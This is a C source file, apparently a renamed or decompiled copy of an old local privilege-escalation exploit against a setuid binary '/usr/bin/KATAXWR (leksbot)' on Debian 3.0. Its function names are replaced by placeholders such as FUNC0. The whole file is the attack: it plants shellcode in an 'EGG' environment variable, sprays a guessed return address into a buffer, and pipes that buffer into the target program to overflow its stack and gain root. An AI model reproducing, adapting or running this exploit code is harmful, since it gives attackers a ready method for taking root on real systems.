#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int ADDR ; 
 int OFFSET ; 
 char* PATH ; 
 int SIZE ; 
 int FUNC0 (char*) ; 
 char* cmd ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 char* shellcode ; 
 int /*<<< orphan*/  FUNC6 (char*,int,char*,char*,char*) ; 
 unsigned long sp ; 
 int FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 

FUNC9(int argc, char *argv[])
{
	char buf[ADDR];
	char egg[SIZE];
	int i, offset ;
	unsigned long ret ;
	unsigned long sp = (unsigned long) &sp ;
	FUNC4("Local (possibly) root exploit for /usr/bin/KATAXWR (leksbot)\n"
	       "tested on Debian 3.0 - usage: ./ex [offset] - by gunzip\n");	
	if ( argv[1] ) offset = FUNC0( argv[1] ); else offset = OFFSET ; 
	ret = sp + offset ;
	FUNC3( cmd, 0x00, SIZE );
	FUNC3( buf, 0x00, ADDR );
	FUNC3( egg, 0x41, SIZE );
	FUNC2( &egg[ SIZE - FUNC7( shellcode ) - 1 ], shellcode, FUNC7( shellcode ));
	FUNC2( egg, "EGG=", 4 );
	egg[ SIZE - 1 ] = 0 ;
	FUNC5( egg );
 	for ( i=0; i < ADDR ; i += 4 ) *( unsigned long *)&buf[ i ] = ret;
	*( unsigned long *)&buf[ ADDR - 4 ] =  0x00000000 ; /*  :-?  */
	if (!(ret&0xff)||!(ret&0xff00)||!(ret&0xff0000)||!(ret&0xff000000)) {
		FUNC4("Return address contains null byte(s), change offset and retry.\n");
		FUNC1( -1 );
	}
	FUNC4( "retaddr=0x%.08x offset=%d len=%d\n", (unsigned int)ret, offset, FUNC7( buf ));
	FUNC6 ( cmd, SIZE - 4, " echo '%s' | %s", buf, PATH );
	FUNC8( cmd );
}